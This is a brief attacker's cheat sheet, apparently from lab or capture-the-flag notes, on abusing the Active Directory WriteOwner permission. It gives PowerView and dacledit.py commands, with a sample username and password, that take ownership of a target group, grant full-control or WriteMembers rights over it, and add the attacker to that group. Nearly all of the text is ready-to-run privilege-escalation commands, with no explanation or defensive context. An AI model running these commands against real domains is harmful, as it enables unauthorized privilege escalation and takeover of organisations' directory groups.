# WriteOwner / ACEs

exploit `WriteOwner` and add myself to group.

```
$ powerview  'mane:password@10.129.231.186'

# 1. Write Owner
PV> Set-DomainObjectOwner -TargetIdentity '<GroupName>' -PrincipalIdentity mane

# 2. Add ACEs
PV> Add-DomainObjectAcl -Rights fullcontrol -ACEType allowed -TargetIdentity '<GroupName>' -PrincipalIdentity mane

## -- OR --

$ python3 dacledit.py  -action 'write' -rights 'WriteMembers' -principal 'mane' -target-dn 'CN=<GroupName>,CN=USERS,DC=MANESEC,DC=COM' 'MANESEC'/'mane':'password'

# 3. Add myself to group

PV> Add-DomainGroupMember -Identity <GroupName> -Members mane

```